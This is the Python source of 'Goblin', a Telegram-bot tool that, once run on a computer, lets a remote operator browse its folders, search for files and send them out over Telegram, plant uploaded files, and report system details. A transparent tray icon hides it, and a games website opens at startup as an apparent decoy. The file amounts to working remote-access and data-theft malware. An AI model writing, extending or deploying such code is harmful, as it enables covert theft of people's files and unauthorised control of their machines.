# ====================================================================================
# App Name : goblin
# Author : Pouya Shahrdami
# ==================================================================================== 

# ====================================================================================
# Checking libraries
# ==================================================================================== 
# import subprocess
# import sys
# import webbrowser


# required_libraries = [
#     "logging", "os", "time", "psutil", "telebot", "pathlib", "threading","platform","pystray"
# ]

# def install_library(library_name):
#     try:
#         subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", library_name])
#         print(f"Installed {library_name} successfully.")
#     except subprocess.CalledProcessError:
#         print(f"Failed to install {library_name}.Please install it manually.")
#         sys.exit(1)  # Exit the application if installation fails

# for library in required_libraries:
#     try:
#         __import__(library)  # Attempt to import the library
#     except ImportError:
#         print(f"Library {library} not found. Installing...")
#         install_library(library)
# ====================================================================================
# End Checking libraries
# ====================================================================================

# ====================================================================================
# * Imports
# ==================================================================================== 
import logging
import os
import time
import psutil
import telebot
from pathlib import Path
from telebot import types
import threading
import platform
from pystray import Icon, Menu as menu, MenuItem as item
import webbrowser
from PIL import Image, ImageDraw
import requests
from io import BytesIO

# ====================================================================================
# * End Imports
# ==================================================================================== 

# ====================================================================================
# Startup
# ====================================================================================
# Create a transparent image
def create_image():
    width = 16
    height = 16
    image = Image.new('RGBA', (width, height), (0, 0, 0, 0))  # Fully transparent
    draw = ImageDraw.Draw(image)
    return image

# Define your website function
def open_website():
    webbrowser.open('https://www.crazygames.com/')

def on_quit():
    icon.stop() 

menu_items = [
    item('Open Website', open_website),
    item('Quit', on_quit)
]
tray_menu = menu(*menu_items)

# Create the transparent tray icon
icon = Icon('Goblin', create_image(), menu=tray_menu)

# ====================================================================================
# End Startup
# ====================================================================================

# ====================================================================================
# Constants and Global Variables
# ====================================================================================

# Token
API_TOKEN = os.getenv(
    "Your Token") or 'Your Token'
bot = telebot.TeleBot(API_TOKEN)

IMAGE_EXTENSIONS = {".jpg", ".jpeg", ".png", ".gif", ".bmp"}
MOVIE_EXTENSIONS = {".mp4"}
ARCHIVE_EXTENSIONS = {".zip", ".rar"}

CHAT_ID = None

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

is_command_running = False  # Global flag
stop_file_listing = threading.Event()
stop_file_sending = threading.Event()
stop_file_dumping = threading.Event()


# ====================================================================================
# End Constants and Global Variables
# ====================================================================================

# ====================================================================================
# Helper Functions
# ====================================================================================




def find_files_by_extension(folder_path, extensions):
    """Finds all files in a folder (recursively) with the specified extensions."""
    try:
        return [str(p) for p in Path(folder_path).rglob("*") if p.suffix.lower() in extensions]
    except FileNotFoundError:
        return []


def send_files(message, file_paths, send_func, max_files=None):
    """Sends files using the provided send function, with optional limit."""
    num_sent = 0
    for file_path in file_paths:
        if stop_file_sending.is_set():
            break  # Stop if the stop event is set

        try:
            send_func(message.chat.id, open(file_path, 'rb'))
            num_sent += 1
            time.sleep(1)  # Adjust delay as needed
            if max_files and num_sent >= max_files:
                break
        except Exception as e:
            logger.error(f"Error sending '{file_path}': {e}")
    bot.reply_to(message, f"✅ {'Stopped' if stop_file_sending.is_set() else 'Done'}. Sent {num_sent} files.")
    stop_file_sending.clear()  # Reset the stop event after stopping


# cd
def list_items_in_directory(message, path, item_type="both"):
    """Lists subfolders or files in a directory with interruption capability."""
    if os.path.exists(path):
        try:
            if item_type == "subfolders":
                items = [f for f in os.listdir(path) if os.path.isdir(os.path.join(path, f))]
                prefix = "📁 "
            elif item_type == "files":
                items = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
                prefix = "📄 "
            else:  # item_type == "both"
                items = os.listdir(path)
                prefix = ""  # No prefix needed for both

            for item in items:
                if stop_file_listing.is_set():
                    break 

                is_dir = os.path.isdir(os.path.join(path, item))
                item_prefix = "📁 " if is_dir else "📄 " if not is_dir else "" 
                try:
                    bot.send_message(message.chat.id, f"{item_prefix}{item}")
                    time.sleep(0.5) 
                except telebot.apihelper.ApiTelegramException as e:
                    logging.error(f"Error sending message: {e}")

                time.sleep(0.1)

        except PermissionError:
            bot.reply_to(message, "⚠️ Permission denied. Cannot access the specified folder.")
    else:
        bot.reply_to(message, "⚠️ Invalid path.")

    bot.reply_to(message, f"✅ {'Stopped' if stop_file_listing.is_set() else 'Done'}.")
    stop_file_listing.clear() 
    

def handle_command_with_path_input(message, command_handler, prompt):
    global is_command_running
    if is_command_running:
        bot.reply_to(message, "⚠️ A command is already running. Please wait.")
        return

    try:
        is_command_running = True
        bot.reply_to(message, prompt)
        bot.register_next_step_handler(message, lambda m: command_handler(m))
    finally:
        is_command_running = False 


def is_valid_path(path):
    """Check if the given path is valid and accessible."""
    return os.path.exists(path) and os.path.isdir(path)


def create_start_keyboard():
    """Creates a custom keyboard for the /start command."""
    markup = types.ReplyKeyboardMarkup(row_width=2)
    commands = [
        '/dump',  # Matches /dump command
        '/cd',  # Matches /cd command
        '/sendfile',  # Matches /sendfile
        '/status',  # Matches /status
    ]

    for command in commands:
        markup.add(types.KeyboardButton(text=command))

    return markup

def search_files(folder_path, search_query):
    """Search for files containing the search query in their name."""
    try:
        return [str(p) for p in Path(folder_path).rglob("*") if search_query.lower() in p.name.lower()]
    except FileNotFoundError:
        return []


def log_error(error_message):
    logger.error(error_message)
    # Optionally notify admin or alert system
    bot.send_message(CHAT_ID, f"⚠️ Error: {error_message}")


def stop_listing():
    global STOP_FILE_LISTING
    STOP_FILE_LISTING = True


def stop_sending():
    global STOP_FILE_LISTING
    STOP_FILE_LISTING = False


def handle_folder_path_for_upload(message):
    """Handles the folder path input and prompts for file upload."""
    folder_path = message.text.strip()

    if not os.path.exists(folder_path) or not os.path.isdir(folder_path):
        bot.reply_to(message, "⚠️ Invalid folder path. Please try again:")
        bot.register_next_step_handler(message, handle_folder_path_for_upload)  # Retry
        return

    bot.reply_to(message, "Please upload the file you want to send:")
    bot.register_next_step_handler(message, lambda m: save_and_send_uploaded_file(m, folder_path))


def save_and_send_uploaded_file(message, folder_path):
    """Saves the uploaded file and sends a confirmation."""
    if message.content_type not in ['photo', 'document']:
        bot.reply_to(message, "⚠️ Invalid file type. Please upload a photo or a document.")
        return

    try:
        if message.content_type == 'photo':
            file_id = message.photo[-1].file_id
            file_name = f"photo_{int(time.time())}.jpg"
        else:  # document
            file_id = message.document.file_id
            file_name = message.document.file_name

        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)

        file_path = os.path.join(folder_path, file_name)

        with open(file_path, 'wb') as new_file:
            new_file.write(downloaded_file)

        bot.reply_to(message, "✅ File saved successfully!")

    except Exception as e:
        logger.error(f"Error saving uploaded file: {e}")
        bot.reply_to(message, "⚠️ An error occurred while saving the file.")


# ====================================================================================
# End Helper Functions
# ====================================================================================

# ====================================================================================
# Command Handlers
# ====================================================================================

@bot.message_handler(commands=['start'])
def handle_start(message):
    """
    Welcomes the user and provides a clear and engaging guide to the bot's capabilities,
    formatted for optimal display in Telegram.
    """
    try:
        global CHAT_ID
        CHAT_ID = message.chat.id

        start_message_parts = [
            "🌟 **Welcome to Goblin** 🌟\n",
            "🧑‍💻Coded by : Pouya Shahrdami\n\nHere's how I can help:\n\n",
            "🗂️ **File Management**\n",
            "/dump <folder_path> - dump files in  folders and subfolders. just by their name , extention , letter\n",
            "/cd <folder_path> - Navigate and explore your directories.\n",
            "/sendfile - Upload a file from Telegram and save it to your PC.\n\n",
            "⚙️ **Other Commands**\n",
            "/status - Check if I'm running and get system info.\n",
            "/dump <folder_path> - dump files in  folders and subfolders. just by their name , extention , letter\n",
            "**Important Notes:**\n",
            "- Always use FULL paths (e.g., `D:\\Images\\Company`).\n",
            "- For `/sendfile`, first give the destination folder, then upload the file.\n\n",
            "My Github : https://github.com/pouyashahrdami\n",
            "My LinkedIn: https://www.linkedin.com/in/pouya-shahrdami-9aa42b303\n\n",
            "Let's get started! 🚀"
        ]

        formatted_start_message = "\n".join(start_message_parts)

        bot.reply_to(message, formatted_start_message, reply_markup=create_start_keyboard())
    except Exception as e:
        logger.error(f"An error occurred in the /start command: {e}")
        bot.reply_to(message, "Alas, an error has occurred. Please try again.")


@bot.message_handler(commands=['status'])
def handle_status(message):
    """
    Handles the /status command, checking if the application is connected 
    and providing OS details if connected
    """
    try:
        bot.reply_to(message, "🔄 Working on it...") 

        os_name = platform.system()
        os_version = platform.release()
        os_architecture = platform.machine()

        response = (
            f"✅ Application is connected!\n\n"
            f"OS Name: {os_name}\n"
            f"OS Version: {os_version}\n"
            f"OS Architecture: {os_architecture}\n"
            f"Processor: {platform.processor()}\n"  # Add processor information
            f"CPU Cores: {psutil.cpu_count(logical=True)}\n"  # Add number of CPU cores
            f"Total RAM: {round(psutil.virtual_memory().total / (1024.0 ** 3), 2)} GB\n"  # Add total RAM in GB
        )

        bot.reply_to(message, response)

    except Exception as e:
        logger.error(f"Error in /status command: {e}")
        bot.reply_to(message, "⚠️ An error occurred while checking the status.")

@bot.message_handler(commands=['dump'])
def handle_search(message):
    """Handles the /dump command to search for files."""
    bot.reply_to(message, "Please enter the FULL path to the folder:")
    bot.register_next_step_handler(message, lambda m: handle_search_query(m))


@bot.message_handler(commands=['getfile'])
def handle_send_file(message):
    """Handles the /getfile command to send a specific file."""
    handle_command_with_path_input(
        message,
        send_specific_file,
        "Please enter the FULL path and filename to send:"
    )


@bot.message_handler(commands=['archive'])
def handle_send_archives(message):
    """Handles the /archive command to send archives."""
    handle_command_with_path_input(
        message,
        send_archives_from_path,
        "Please enter the FULL path to the folder (archives will be searched recursively):"
    )


@bot.message_handler(commands=['sendfile'])
def handle_sendfile(message):
    """Handles the /sendfile command to send a file to the user."""
    bot.reply_to(message, "Please enter the FULL path to the folder where you want to save the file:")
    bot.register_next_step_handler(message, handle_folder_path_for_upload)


@bot.message_handler(commands=['cd'])
def handle_cd(message):
    """Handles the /cd command to navigate and list subfolders and files."""
    handle_command_with_path_input(
        message,
        lambda m: list_items_in_directory(m, m.text.strip(), item_type="both"),
        "Please enter the FULL path to the folder or drive (e.g., D:\\Images or D:\\):"
    )


@bot.message_handler(commands=['stop'])
def handle_stop(message):
    """Handles the /stop command to interrupt file sending."""
    stop_file_listing.set()   # Signal to stop listing
    stop_file_sending.set()   # Signal to stop sending
    stop_file_dumping.set()   # Signal to stop dumping
    bot.reply_to(message, "🛑 Stopping file operations...")


# ====================================================================================
# End Command Handlers
# ====================================================================================


# ====================================================================================
# Command Functions
# ====================================================================================


def send_specific_file(message):
    file_path = message.text.strip()

    try:
        if not os.path.isfile(file_path):
            bot.reply_to(message, f"⚠️ File not found: {file_path}")
            return

        file_extension = os.path.splitext(file_path)[1].lower()  # Get file extension

        # Determine how to send based on file type
        if file_extension in IMAGE_EXTENSIONS:
            bot.send_photo(message.chat.id, open(file_path, 'rb'))
        elif file_extension in MOVIE_EXTENSIONS:
            bot.send_video(message.chat.id, open(file_path, 'rb'))
        else:  # Default to sending as document
            bot.send_document(message.chat.id, open(file_path, 'rb'))

        bot.reply_to(message, "✅ File sent successfully!")

    except Exception as e:
        logger.error(f"Error sending '{file_path}': {e}")
        bot.reply_to(message, f"⚠️ Error sending file: {e}")


def send_archives_from_path(message):
    """Sends ZIP and RAR archives from a folder recursively."""
    folder_path = message.text.strip()

    try:
        archive_files = find_files_by_extension(folder_path, ARCHIVE_EXTENSIONS)

        if not archive_files:
            bot.reply_to(message, f"⚠️ No archive files found in {folder_path}")
            return

        for file_path in archive_files:
            try:
                with open(file_path, 'rb') as file:
                    if file_path.endswith(".zip"):
                        bot.send_document(message.chat.id, file)
                    elif file_path.endswith(".rar"):
                        # Send the RAR file directly without extraction
                        bot.send_document(message.chat.id, file)
                time.sleep(1)
            except Exception as e:
                logger.error(f"Error sending '{file_path}': {e}")
    except FileNotFoundError:
        bot.reply_to(message, f"⚠️ Folder not found: {folder_path}")
    finally:
        bot.reply_to(message, "✅ Done.")


def handle_search_query(message):
    """Handles the search query step."""
    folder_path = message.text.strip()
    bot.reply_to(message, "Please enter the search query:")
    bot.register_next_step_handler(message, lambda m: search_and_send_files(m, folder_path))


def search_and_send_files(message, folder_path):
    """Searches for files and sends them based on the search query."""
    search_query = message.text.strip()
    files = search_files(folder_path, search_query)
    
    if files:
        num_sent = 0
        for file_path in files:
            if stop_file_dumping.is_set():
                break  # Stop the search if the event is set
                
            try:
                bot.send_document(message.chat.id, open(file_path, 'rb'))
                num_sent += 1
                time.sleep(1)  # Adjust delay as needed
            except Exception as e:
                logger.error(f"Error sending '{file_path}': {e}")

        bot.reply_to(message, f"✅ {'Stopped' if stop_file_dumping.is_set() else 'Done'}. Sent {num_sent} files.")
    else:
        bot.reply_to(message, "⚠️ No files found matching the search query.")
    
    stop_file_dumping.clear()  # Reset the event

# ====================================================================================
# End Command Functions
# ====================================================================================

# ====================================================================================
# Main Loop
# ====================================================================================
if __name__ == '__main__':
    # Start the Telegram bot polling in a separate thread
    bot_thread = threading.Thread(target=bot.polling, kwargs={'none_stop': True})
    bot_thread.start()
    # Open the website on startup
    open_website()
    # Run the tray icon application at the end
    icon.run() 
# ====================================================================================
# End Main Loop
# ====================================================================================
